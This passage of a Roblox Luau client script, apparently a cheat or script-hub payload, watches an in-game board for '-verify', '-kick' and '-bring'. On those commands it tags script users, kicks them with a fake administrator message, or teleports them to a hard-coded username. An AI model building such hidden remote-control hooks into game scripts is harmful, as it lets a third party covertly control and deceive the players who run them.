local Event = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l")

local function CreateTag(player, text)
    if not player or not player.Character then return end
    local head = player.Character:FindFirstChild("Head")
    if not head then return end
    
    local old = head:FindFirstChild("TagVerification")
    if old then old:Destroy() end
    
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "TagVerification"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 200, 0, 40)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 120
    billboard.Parent = head
    
    local frame = Instance.new("Frame", billboard)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(0, 180, 255)
    stroke.Thickness = 1.5
    
    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, -8, 1, -8)
    label.Position = UDim2.new(0, 4, 0, 4)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextSize = 14
    label.Font = Enum.Font.GothamBold
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
end

local function EquipTinCup()
    Event:InvokeServer("PickingTools", "TinCup")
end

local function DoKick()
    LocalPlayer:Kick("You have been kicked by an administrator.")
end

local function DoBring()
    local target = Players:FindFirstChild("pedritohacjel")
    if not target then return end
    if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
    local rootTarget = target.Character.HumanoidRootPart
    local rootLocal = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if rootLocal then
        rootLocal.CFrame = rootTarget.CFrame * CFrame.new(0, 0, 3)
    end
end

local function VerifyUsers()
    EquipTinCup()
    
    task.delay(0.5, function()
        for _, player in ipairs(Players:GetPlayers()) do
            local function hasCup()
                return (player.Backpack and player.Backpack:FindFirstChild("TinCup"))
                    or (player.Character and player.Character:FindFirstChild("TinCup"))
            end
            
            if hasCup() and player.Character then
                CreateTag(player, "Usuario de Irvinglz1")
            end
        end
    end)
end

local lastText = ""

task.spawn(function()
    while true do
        task.wait(0.1)
        
        local text = BoardLabel.Text
        if not text or text == "" or text == " " then
            lastText = ""
            continue
        end
        
        if text == lastText then
            continue
        end
        
        lastText = text
        
        if string.lower(text) == "-verify" then
            VerifyUsers()
            continue
        end
        
        if string.lower(text) == "-kick" then
            DoKick()
            continue
        end
        
        if string.lower(text) == "-bring" then
            DoBring()
            continue
        end
    end
end)

